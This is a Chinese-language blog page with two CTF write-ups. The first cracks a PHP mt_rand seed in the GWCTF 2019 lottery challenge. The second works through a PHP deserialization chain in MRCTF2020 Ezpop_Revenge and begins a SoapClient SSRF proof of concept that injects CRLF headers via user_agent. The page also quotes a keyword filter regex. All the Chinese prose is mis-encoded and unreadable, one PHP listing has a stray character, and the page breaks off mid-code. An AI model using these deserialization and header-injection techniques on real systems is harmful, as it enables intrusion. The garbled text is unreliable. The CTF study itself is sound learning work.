<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
<meta property="og:type" content="website">
<meta property="og:title" content="inanb">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="inanb">
<meta property="og:description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="inanb">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>inanb</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">inanb</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">æ˜¨å¤œé›¨ç–é£éª¤ æµ“ç¡ä¸æ¶ˆæ®‹é…’</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/11/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/11/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/" class="post-title-link" itemprop="url">æ¯ç‡¥çš„æŠ½å¥–</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-04-11 20:47:44 / ä¿®æ”¹æ—¶é—´ï¼š21:06:50" itemprop="dateCreated datePublished" datetime="2021-04-11T20:47:44+08:00">2021-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h3><p><img src="/images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/image-20210411205041425.png" alt="image-20210411205041425"></p>
<p>æäº¤ä¸€ä¸ªæ•°å­—ï¼Œnetworké‡Œå‘ç°æäº¤ç»™äº†check.phpï¼Œè®¿é—®ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>åœ¨sessionä¸­éšæœºç”Ÿæˆä¸€ä¸ªç§å­ï¼Œå¦‚æœç§å­ç¡®å®šï¼Œåˆ™åæ¥ç”Ÿæˆçš„éšæœºæ•°ä¹Ÿæ˜¯ç¡®å®šçš„â€¦â€¦</p>
<p>æ›´æ”¹sessionï¼Œç›¸åŒçš„sessionå‡ºç°çš„å­—ç¬¦ä¸²å‰åä½ä¸å˜</p>
<p>ç”Ÿæˆçš„å­—ç¬¦ä¸²ç”±ç§å­ç¡®å®šçš„éšæœºæ•°ç¡®å®šï¼Œæˆ‘ä»¬è¦ä»å·²æœ‰çš„å‡ ç»„æ•°æ®ä¸­çˆ†ç ´å‡ºç§å­</p>
<blockquote>
<p><em>æœ¬æ¥æƒ³ç”¨phpå†™ä¸ªè„šæœ¬ï¼Œå‘ç°è¿™ä¸ªæƒ³æ³•ä¸ç°å®ï¼Œæ€§èƒ½æ‹‰è·¨â€¦â€¦</em></p>
</blockquote>
<p><strong>php_mt_seed-4.0</strong>å·¥å…·å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆç ´è§£ï¼Œä½†é¦–å…ˆæˆ‘ä»¬è¦è¿˜åŸæ•°æ®ä¸ºåˆæ³•çš„æ ¼å¼</p>
<blockquote>
<p><strong>ä¸€ä¸ªå‚æ•°</strong></p>
<p>å½“åªæœ‰ä¸€ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨mt_randç¬¬ä¸€æ¬¡è¾“å‡ºçš„å€¼ã€‚</p>
<p><strong>ä¸¤ä¸ªå‚æ•°</strong></p>
<p>å½“æœ‰ä¸¤ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œä»–ä»¬ä»£è¡¨mt_randç¬¬ä¸€æ¬¡è¾“å‡ºåº”è¯¥ä½äºä»€ä¹ˆåŒºé—´å†…ã€‚</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæœ€å°å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæœ€å¤§å€¼ã€‚</p>
<p><strong>å››ä¸ªå‚æ•°</strong></p>
<p>å‰ä¸¤ä¸ªå‚æ•°è¡¨ç¤ºmt_randç¬¬ä¸€æ¬¡è¾“å‡ºçš„åŒºé—´ï¼Œåä¸¤ä¸ªå‚æ•°è¡¨ç¤ºmt_randè¾“å‡ºçš„åŒºé—´ã€‚</p>
<p><strong>å¤šäºäº”ä¸ªå‚æ•°</strong></p>
<p>æ¯å››ä¸ªå‚æ•°ä¸€ç»„ï¼Œä½†æ˜¯æœ€åä¸€ç»„å¯ä»¥æ˜¯1ï¼Œ2æˆ–4ä¸ªå‚æ•°ã€‚æ¯ä¸€ç»„å¼•ç”¨å¯¹åº”çš„è¾“å‡ºã€‚</p>
</blockquote>
<p>è¿˜åŸè„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j in range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">&#x27; &#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/image-20210411210432842.png" alt="image-20210411210432842"></p>
<p>ç¬¬ä¸€æ¬¡è¾“å‡ºçš„åŒºé—´ï¼šå›ºå®šç›¸åŒçš„ä¸¤ä¸ªæ•°</p>
<p>mt_randè¾“å‡ºçš„åŒºé—´ï¼šåªèƒ½æ˜¯0-61</p>
<p>æ”¾åˆ°php_mt_seedé‡Œï¼š</p>
<p><img src="/images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/image-20210411210619599.png" alt="image-20210411210619599"></p>
<p>å¾—åˆ°seedï¼Œå†æ ¹æ®seedæ‰¾åˆ°å®Œæ•´å­—ç¬¦ä¸²å³å¯~</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/04/MRCTF2020-Ezpop-Revenge/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/04/MRCTF2020-Ezpop-Revenge/" class="post-title-link" itemprop="url">MRCTF2020-Ezpop_Revenge</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-04-04 16:54:24 / ä¿®æ”¹æ—¶é—´ï¼š20:01:03" itemprop="dateCreated datePublished" datetime="2021-04-04T16:54:24+08:00">2021-04-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>åšäº†ezpopï¼Œçœ‹åˆ°è¿™é“é¢˜ï¼Œå°±æƒ³å°è¯•ä¸€ä¸‹ï¼Œç»“æœâ€¦â€¦æ— è¯­å‡å™</p>
<p>è¿›å…¥é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªæ­å»ºçš„åšå®¢ï¼Œæ‰«å‡º<a href="http://www.zipç½‘ç«™æºç ï¼š">www.zipç½‘ç«™æºç ï¼š</a></p>
<img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404165801705.png" alt="image-20210404165801705" style="zoom:80%;" />

<blockquote>
<p>ï¼ˆéå¸¸ææ€–</p>
</blockquote>
<p>è¿™é‡Œæœ‰å¾ˆå¤šç½‘é¡µçš„ä»£ç ï¼Œæ—¢ç„¶æ˜¯Revengeï¼Œåº”è¯¥æ˜¯ååºåˆ—åŒ–é¢˜ç›®ï¼Œåœ¨æ–‡ä»¶å†…æŸ¥æ‰¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Plugin.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ååºåˆ—åŒ–äº†ä¸€ä¸ªpostçš„æ•°æ®ï¼Œå¹¶ä¸”åšäº†è¿‡æ»¤â€¦â€¦ä¸ç®¡å¦‚ä½•åˆ©ç”¨ï¼Œå…ˆä»è¿™é‡Œæ‰¾ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸Šæ–¹æœ‰ä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wakeupçš„é­”æ³•æ–¹æ³•ï¼Œå¯ä»¥ååºåˆ—åŒ–è°ƒç”¨ï¼Œè·Ÿè¿›Typecho_Dbï¼š</p>
<p>ï¼ˆä»£ç å¤ªå¤šï¼Œè¿™é‡Œé€‰æ‹©æœ‰ç”¨çš„éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Db.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">        $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œäº†æ‹¼æ¥ï¼Œï¼ˆå¤§æ¦‚ï¼‰å¯ä»¥è”æƒ³åˆ°toStringæ–¹æ³•ï¼Œé‚£æœ‰æ²¡æœ‰å‘¢ï¼Ÿï¼ˆå¾ˆå¤šâ€¦â€¦ä¸€å®šè¦æ³¨æ„å…¶å½¢å¼æ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼Œç»éªŒå’Œæ„Ÿè§‰å¾ˆé‡è¦ï¼Œå—¯ï¼Œç„å­¦ï¼‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Query.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªé’ˆå¯¹sqlè¯­å¥çš„æ¡ä»¶åˆ†æ”¯ï¼Œæ³¨æ„selectè¿™é‡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br></pre></td></tr></table></figure>

<p>å°±å¾ˆåƒååºåˆ—åŒ–ç»ƒä¹ ä¸­__callå‡½æ•°çš„è°ƒç”¨ï¼ŒæŸ¥äº†ä¸€ä¸‹__callå‡½æ•°ï¼Œä¼¼ä¹æ²¡æœ‰åˆ©ç”¨ç‚¹â€¦â€¦</p>
<h3 id="SOAP-ååºåˆ—åŒ–"><a href="#SOAP-ååºåˆ—åŒ–" class="headerlink" title="SOAP ååºåˆ—åŒ–"></a>SOAP ååºåˆ—åŒ–</h3><p>dalaoï¼š<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p>
<blockquote>
<p>SOAP æ˜¯ä¸€ç§ç®€å•çš„åŸºäº XML çš„åè®®ï¼Œå®ƒä½¿åº”ç”¨ç¨‹åºé€šè¿‡ HTTP æ¥äº¤æ¢ä¿¡æ¯ã€‚</p>
</blockquote>
<p>ä¸ºphpå®‰è£…soapæ‹“å±•åï¼š</p>
<p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404172608327.png" alt="image-20210404172608327"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒSoapClientç±»è‡ªå¸¦æœ‰__callæ–¹æ³•ï¼Œç”±æ­¤è¯ç”Ÿäº†SOAPååºåˆ—åŒ–ssrfåˆ©ç”¨ã€‚</p>
<p>æœ¬åœ°é‡å¤å®éªŒï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"></span><br><span class="line">$c = unserialize($aaa);</span><br><span 